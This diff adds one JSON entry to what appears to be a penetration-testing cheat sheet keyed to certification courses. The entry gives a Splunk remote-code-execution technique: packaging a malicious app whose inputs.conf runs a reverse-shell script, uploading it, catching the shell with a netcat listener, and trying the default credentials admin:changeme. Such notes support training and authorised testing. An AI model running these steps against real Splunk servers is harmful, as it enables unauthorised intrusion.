@@ -1,0 +1,78 @@
+{
+  "type": "script",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "splunk"
+  ],
+  "tags": [
+    "splunk",
+    "rce",
+    "reverse-shell"
+  ],
+  "category": "Exploitation",
+  "subcategory": "Splunk",
+  "certifications": [
+    "CPTS",
+    "CWES",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 24: Attacking Common Applications",
+  "examples": [
+    {
+      "label": "Package the malicious Splunk app for upload",
+      "command": "git clone https://github.com/0xjpuff/reverse_shell_splunk"
+    },
+    {
+      "label": "inputs.conf runs the reverse-shell script on an interval",
+      "command": "# inputs.conf: [script://./bin/rev.py] disabled=0 interval=10 sourcetype=shell"
+    },
+    {
+      "label": "Catch the shell on a listener",
+      "command": "sudo nc -lnvp 443"
+    }
+  ],
+  "notes": "Default creds admin:changeme. Windows uses a .bat launcher calling PowerShell; Linux uses rev.py.",
+  "references": [
+    {
+      "title": "reverse_shell_splunk (0xjpuff)",
+      "url": "https://github.com/0xjpuff/reverse_shell_splunk"
+    },
+    {
+      "title": "HTB Academy - Attacking Common Applications",
+      "url": "https://academy.hackthebox.com/module/details/113"
+    },
+    {
+      "title": "OffSec PEN-200 - Web Application Attacks",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "reverse-shell-oneliners",
+      "note": "Payload options for the app's scripted input.",
+      "rel": "escalation"
+    },
+    {
+      "id": "other-apps-defaults",
+      "note": "Try default Splunk creds to reach the upload page.",
+      "rel": "prereq"
+    }
+  ],
+  "id": "splunk-app-revshell",
+  "name": "Splunk - Malicious App Reverse Shell",
+  "command": "tar -cvzf updater.tar.gz splunk_shell/   # upload via Manage Apps > Install app from file",
+  "description": "Splunk runs scripted inputs from installed apps. Package an app whose inputs.conf runs a reverse-shell script (rev.py/run.ps1), upload it, and Splunk executes it - RCE as the Splunk user.",
+  "opsec": "loud",
+  "mitre": [
+    "T1190",
+    "T1059.001"
+  ],
+  "exam": "exam-ok"
+}
